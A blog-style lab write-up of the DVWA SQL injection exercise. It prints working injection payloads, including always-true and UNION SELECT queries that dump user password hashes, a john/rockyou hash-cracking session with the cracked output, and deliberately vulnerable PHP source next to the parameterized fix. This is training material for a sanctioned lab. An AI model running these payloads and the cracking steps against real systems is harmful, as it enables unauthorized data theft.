---
title: DVWA - SQL Injection
date: 2023-12-12
categories: [DVWA, SQL Injection]
tags: [dvwa , sqli, burp-suite]
img_path: /assets/dvwa/sqli
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## SQL Injection

A SQL injection (SQLi) attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQLi exploit can **read sensitive data from the database**, **modify database data** (insert/update/delete), **execute administration operations on the database** (such as shutdown the DBMS), **recover the content of a given file present on the DBMS file system** (load_file) and in some cases **issue commands to the operating system**. SQLi attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.

**Objective**: There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi.

## PHP required configurations

Before start working on this lab, we must ensure that the `display_errors` PHP configuration is `On`. If not we won't be able to get any error messages back which will make the lab much harder.

1. Go to PHP Info and check the value of `display_errors` variable:

    ![](php_info.png){: width='70%' }

    ![](errors_off.png)

2. In case this is `Off`, scroll up and find the path to the `php.ini` file:

    ![](config_path.png)

3. Change `display_errors` to `On` on both parts of the file:

    ```shell
    # edit the php.ini file, change the path if different
    $ sudo nano /etc/php/8.2/fpm/php.ini
    ```

    Press `CTRL+W` > 'display_errors' > `ENTER` > Change to `On`.

    ![](config_file_errors1.png){: width='80%' }

    Press `CTRL+W` again > 'display_errors' > `ENTER` > Change to `On`.

    ![](config_file_errors2.png){: width='80%' }

    Press `CTRL+X` to exit and save the file.

4. Restart the PHP service (change `8.2` to the appropriate version if different):

    ```shell
    # restart the php-fpm service
    $ sudo service php8.2-fpm restart
    ```

5. Refresh the PHP Info page:

    ![](errors_on.png)

## Security: Low
> [Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli/sqli_low_source_code.php)


> _The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any SQL query they wish._

1. If we put `1` as input we get back the `ID` (our input), `First name`, and `Surname` fields. 

    ![](home_id1.png)

    This translates to:
    ```sql
    SELECT first_name, last_name 
    FROM users 
    WHERE user_id = '1';
    ```

2. We can try to break the query by inserting a single quote, `'`, and see what happens:

    ![](single_quote.png)


3. We can try the "[Always True Scenario](https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson6/index.html)": if we input something that does not exist, such as `%'`, and follow that by something that is always `TRUE`, such as `'1'='1`, we will get everything back. We are essentially saying "_display all records that are `FALSE` and all records that are `TRUE`_":

    ![](sqli_users.png)

    This translates to: 
    ```sql
    SELECT first_name, last_name 
    FROM users 
    WHERE user_id = '6' 
    OR '1'='1'
    ```

3. So we have the `First name` and `Surname` fields of all 5 users. We need to first find out if more fields are available in the database. According to [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks) one way of doing that is by performing a **UNION attack** and the use of `ORDER BY` clause:

    > Notice that we are using [MariaDB](https://mariadb.com/kb/en/comment-syntax/), so we need to end our payload either with `#` or `-- `.

    If we inject `' ORDER BY 1-- ` we get nothing back, so we increment the number until we get an error:

    ![](order_by_3.png)

4. We got the error on `3`, so this confirms that there are only 2 fields in that table. We can try guessing those fields, for instance, inputting `' UNION SELECT username, password FROM users#`:

    ![](username_error.png)

5. The field `username` does not exist, so we could try changing that to something similar, such as `' UNION SELECT user, password FROM users#`:

    ![](user_success.png)

6. The database gaves the passwords in hash format instead of plaintext. We can find the hash type as follows:

    ```shell
    # check the hash type
    $ hashid 5f4dcc3b5aa765d61d8327deb882cf99
    Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
    [+] MD2
    [+] MD5
    [+] MD4
    [+] Double MD5
    [+] LM
    [+] RIPEMD-128
    [+] Haval-128
    [+] Tiger-128
    [+] Skein-256(128)
    [+] Skein-512(128)
    [+] Lotus Notes/Domino 5
    [+] Skype
    [+] Snefru-128
    [+] NTLM
    [+] Domain Cached Credentials
    [+] Domain Cached Credentials 2
    [+] DNSSEC(NSEC3)
    [+] RAdmin v2.x
    ```

7. We can copy and paste all 5 hashes (one per line) into a text file and use `john` to crack them:

    ```shell
    # copy and paste the hashes into a txt file
    $ cat hashes
    5f4dcc3b5aa765d61d8327deb882cf99
    e99a18c428cb38d5f260853678922e03
    8d3533d75ae2c3966d7e0d4fcc69216b
    0d107d09f5bbe40cade3de5c71e9e9b7
    5f4dcc3b5aa765d61d8327deb882cf99

    # find how the MD5 format is defined
    $ john --list=formats | grep MD5
    416 formats (149 dynamic formats shown as just "dynamic_n" here)
    Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1,
    Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1,
    solarwinds, SSH, sspr, Stribog-256, Stribog-512, STRIP, SunMD5, SybaseASE,
    HMAC-MD5, HMAC-SHA1, HMAC-SHA224, HMAC-SHA256, HMAC-SHA384, HMAC-SHA512,

    # crack the hashes
    $ john --format=Raw-MD5 hashes --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
    Warning: no OpenMP support for this hash type, consider --fork=16
    Press 'q' or Ctrl-C to abort, almost any other key for status
    password         (?)
    abc123           (?)
    letmein          (?)
    charley          (?)
    4g 0:00:00:00 DONE (2023-12-12 16:49) 133.3g/s 102400p/s 102400c/s 179200C/s skyblue..dangerous
    Warning: passwords printed above might not be all those cracked
    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
    Session completed.
    ```

    > Notice that the first and last hash are the same, that is why we have 4 passwords as our output.


## Security: Medium

> _The medium level uses a form of SQL injection protection, with the function of [`mysql_real_escape_string()`](https://www.php.net/manual/en/function.mysql-real-escape-string.php). However due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered. The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form._

```php
# source code for medium security
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Display values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?> 
```



## Security: High

> _This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request._

```php
# source code for high security
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Get values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

?> 
```

## Security: Impossible

> _The queries are now parameterized queries (rather than being dynamic). This means the query has been defined by the developer, and has distinguish which sections are code, and the rest is data._

```php
# source code for impossible security
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        $id = intval ($id);
        switch ($_DVWA['SQLI_DB']) {
            case MYSQL:
                // Check the database
                $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
                $data->bindParam( ':id', $id, PDO::PARAM_INT );
                $data->execute();
                $row = $data->fetch();

                // Make sure only 1 result is returned
                if( $data->rowCount() == 1 ) {
                    // Get values
                    $first = $row[ 'first_name' ];
                    $last  = $row[ 'last_name' ];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
                break;
            case SQLITE:
                global $sqlite_db_connection;

                $stmt = $sqlite_db_connection->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' );
                $stmt->bindValue(':id',$id,SQLITE3_INTEGER);
                $result = $stmt->execute();
                $result->finalize();
                if ($result !== false) {
                    // There is no way to get the number of rows returned
                    // This checks the number of columns (not rows) just
                    // as a precaution, but it won't stop someone dumping
                    // multiple rows and viewing them one at a time.

                    $num_columns = $result->numColumns();
                    if ($num_columns == 2) {
                        $row = $result->fetchArray();

                        // Get values
                        $first = $row[ 'first_name' ];
                        $last  = $row[ 'last_name' ];

                        // Feedback for end user
                        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                    }
                }

                break;
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

## Resources

- [Cryptocat's video walkthrough](https://www.youtube.com/watch?v=5bj1pFmyyBA).
- [PortSwigger SQLi](https://portswigger.net/web-security/sql-injection/union-attacks)